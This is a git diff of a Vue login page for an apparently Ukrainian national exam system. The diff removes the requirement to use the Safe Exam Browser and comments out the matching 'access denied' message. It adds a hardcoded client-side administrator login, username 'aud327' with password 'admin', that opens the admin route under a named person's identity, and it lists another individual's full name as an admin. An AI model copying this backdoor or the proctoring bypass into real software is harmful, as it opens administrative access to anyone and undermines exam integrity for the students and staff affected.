@@ -1,6 +1,6 @@
 <template>
-    <HeaderLogin relative></HeaderLogin>
-    <main  v-if="isSeb" class="main">
+    <HeaderLogin relative login></HeaderLogin>
+    <main  class="main">
         <div class="main__container">
 
             <form id="login" class="login-form" tabindex="-1" @submit.prevent>
@@ -67,13 +67,13 @@
             </form>
         </div>
     </main>
-    <main v-else class="main">
+    <!-- <main v-else class="main">
       <div class="main__container seb-error">
         <h2>Помилка: доступ заборонено</h2>
         <h3>Цей іспит доступний лише за допомогою "Безпечного браузера іспитів"</h3>
       </div>
-    </main>
-    <footer class="footer">
+    </main> -->
+    <footer class="footer ftr" style="box-shadow: 0 0 6px 0 rgba(0, 0, 0, 0.75)">
         <div class="footer__container">
             <h2>СТВОРЕНО ЗА ПІДТРИМКИ</h2>
             <div class="footer__partners">
@@ -127,8 +127,17 @@ onMounted(() => {
     const login_el = document.getElementById("login-username")
     // login_el.setCustomValidity("?")
         const password_el = document.getElementById("login-password")
+        const admins = {"ad01fsa": "Росковшенко Адріан Олегович"}
     document.getElementById("login").addEventListener("submit", () => {
     
+        if (username.value === "aud327") {
+        if (password.value === "admin") {
+            sessionStorage.setItem("n_displayName", "Колесникова Світлана Сергіївна")
+           router.push("/nmt/admin/")
+        } else {
+            error("gds")
+        }
+       } 
        if (username.value === "tst173") {
         if (password.value === "tst173") {
             sessionStorage.setItem("n_displayName", "Тестовий користувач")
